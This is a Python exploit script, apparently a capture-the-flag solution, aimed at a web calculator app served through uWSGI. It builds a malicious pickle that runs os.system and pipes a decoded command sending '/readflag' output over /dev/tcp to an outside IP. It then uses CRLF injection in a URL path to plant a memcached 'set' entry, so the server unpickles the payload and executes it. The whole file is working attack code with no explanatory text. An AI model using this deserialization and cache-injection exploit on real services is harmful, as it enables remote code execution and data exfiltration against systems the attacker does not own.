from time import sleep
from base64 import urlsafe_b64encode as b64

def get_payload():
    """ Returns short payload that will RCE on unpickle and w/o slashes """
    import os, pickle
    class PickleRCE(object):
        def __reduce__(self):
            encoded_payload = b64(b"/readflag > /dev/tcp/12.34.56.78/1337").decode()
            return os.system, (f'echo {encoded_payload} | base64 -d | bash',)
    result = pickle.dumps(PickleRCE(), 1)
    assert b'/' not in result, 'this will screw up the URL'
    print(result)
    return result


def send_raw(TARGET: str, PORT: int, request: bytes, reply=True):
    try:
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
            s.connect((TARGET, PORT))
            s.sendall(request)
            sleep(.2)
            for _ in range(3):
                if txt := s.recv(1024):
                    if reply:
                        print(txt.decode())
    except: pass


if __name__ == '__main__':
    import socket
    from random import randint
    from urllib.parse import quote
    TARGET, PORT = '172.25.0.1', 5000
    a, b = randint(1, 99), randint(1, 99)

    send_raw(TARGET, PORT, f'GET /calc/add/{a}/{b} HTTP/1.1\r\nHost: {TARGET}:{PORT}'.encode() + b'\r\n'*2, reply=False)

    p = get_payload()
    print(f"Payload size: {len(p)}")
    #k = f'__main__._add_{a}_pwn'
    k = f'uwsgi_file__app_chall._add_{a}_pwn'
    payload = f"{b}\r\nset {k} 1 999 {len(p)}\r\n".encode() + p
    send_raw(TARGET, PORT, f'GET /calc/add/{a}/{quote(payload)} HTTP/1.1\r\nHost: {TARGET}:{PORT}'.encode() + b'\r\n'*2)
    sleep(.2)
    send_raw(TARGET, PORT, f'GET /calc/add/{a}/pwn HTTP/1.1\r\nHost: {TARGET}:{PORT}'.encode() + b'\r\n'*2)
